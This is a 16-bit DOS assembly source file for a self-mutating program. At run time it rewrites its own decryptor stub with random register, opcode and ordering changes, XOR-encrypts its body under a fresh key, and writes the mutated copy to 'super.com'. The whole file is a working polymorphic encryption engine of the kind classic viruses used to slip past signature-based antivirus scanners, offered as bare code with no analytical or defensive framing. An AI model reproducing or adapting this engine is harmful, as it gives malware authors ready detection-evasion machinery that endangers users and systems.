code    segment
        assume  cs:code
        org     100h
prog:
        mov     cx,(offset last - offset main + 1) / 2
        mov     dx,0
        mov     si,offset main
        cmp     ax,0
        xor     cx,0
        nop
        xor     si,0
        nop
l103:   inc     ax
l102:   inc     bp
l101:   clc
l100:   xor     word ptr [si],dx
        inc     si
        inc     si
        dec     ax
        dec     bp
        loop    l100

main:
        call    make
        call    save

        mov     al,00h
        mov     ah,4ch
        int     21h

cdc     dw      0

make    proc    near
        call    copy
        mov     bx,offset dcdr
        call    ch1
        call    ch2
        mov     bp,bx
        mov     di,offset dcdd
        call    ch30
        call    copy1
        call    ch4
        ret
make    endp

save    proc    near
        mov     ah,3ch
        mov     dx,offset fn
        sub     cx,cx
        int     21h
        jc      ioerr
        mov     bx,ax
        mov     dx,offset prog
        mov     cx,offset last - offset prog
        mov     ax,es
        mov     ds,ax
        mov     ah,40h
        int     21h
        jc      ioerr
        mov     ah,3eh
        int     21h
ioerr:  ret
save    endp

copy1   proc    near
        mov     si,offset dcdr
        mov     di,offset prog
        mov     cx,offset dcdd - offset dcdr
        rep     movsb
        ret
copy1   endp

ch4     proc    near
        mov     ax,cdc
        mov     bx,offset main
        mov     cx,(offset last - offset main + 1) / 2
        push    es
        pop     ds
lch4:   xor     word ptr [bx],ax
        inc     bx
        inc     bx
        loop    lch4
        push    cs
        pop     ds
        ret
ch4     endp

ch30    proc    near
        sub     cx,cx
        mov     cl,byte ptr [di]
        inc     di
l30:    call    ch31
        add     di,3
        loop    l30
        ret
ch30    endp

ch31    proc    near
        push    cx
        mov     cx,8
l31:    call    rndm
        call    ch32
        loop    l31
        pop     cx
        ret
ch31    endp

ch32    proc    near
        sub     ax,ax
        mov     al,byte ptr [di]
        mov     si,bp
        add     si,ax
        mov     al,byte ptr [di+1]
        mov     bx,ax
        mov     al,byte ptr [di+2]
        call    ch33
        ret
ch32    endp

ch33    proc    near
        push    cx
lbeg:   rcr     dx,1
        jc      noch
        mov     cx,bx
lch:    mov     ah,byte ptr [si]
        xchg    ah,byte ptr [si+bx]
        mov     byte ptr [si],ah
        inc     si
        loop    lch
        jmp     short lend
noch:   add     si,bx
lend:   dec     al
        jnz     lbeg
        pop     cx
        ret
ch33    endp


ch2     proc    near
        rcr     dx,1
        jc      nobx
        inc     byte ptr [bx+03]
        add     byte ptr [bx+24],8
nobx:   rcr     dx,1
        jc      nodi
        inc     byte ptr [bx+06]
        inc     byte ptr [bx+17]
        inc     byte ptr [bx+24]
        inc     byte ptr [bx+25]
        inc     byte ptr [bx+26]
nodi:   ret
ch2     endp

ch1     proc    near
        call    irnd
        mov     word ptr [bx+04],dx
        mov     cdc,dx
        call    rndm
        mov     word ptr [bx+01],(offset last - offset main + 1) / 2
        xor     word ptr [bx+01],dx
        xor     word ptr [bx+14],dx
        call    rndm
        mov     word ptr [bx+07],offset main
        xor     word ptr [bx+07],dx
        xor     word ptr [bx+18],dx
        call    rndm
        mov     word ptr [bx+10],dx
        rcr     dx,1
        jc      no1
        inc     byte ptr [bx+30]
no1:    rcr     dx,1
        jc      no2
        inc     byte ptr [bx+30]
        inc     byte ptr [bx+30]
no2:    ret
ch1     endp

copy    proc    near
        mov     ax,cs
        add     ax,1000h
        mov     es,ax
        mov     si,offset prog
        mov     di,si
        mov     cx,offset last - offset prog
        rep     movsb
        ret
copy    endp

irnd    proc    near
        mov     ah,2ch
        int     21h
        add     dx,cx
        ret
irnd    endp

rndm    proc    near
        mov     ax,cs
        mul     dx
        add     dx,ax
        ret
rndm    endp

dcdr    db      0b9h,0aeh,0,0bah,10h,20h
        db      0beh,1fh,1,3dh,0,0
        db      81h,0f1h,0,0
        db      81h,0f6h,0,0
        db      40h,45h,0f8h
        db      31h,14h
        db      46h,46h,48h,4dh
        db      0e2h,0f5h

dcdd    db      4,0,3,3,12,4,1,20,1,2,25,1,3

fn      db      'super.com',0

last    label   byte
code    ends
        end     prog

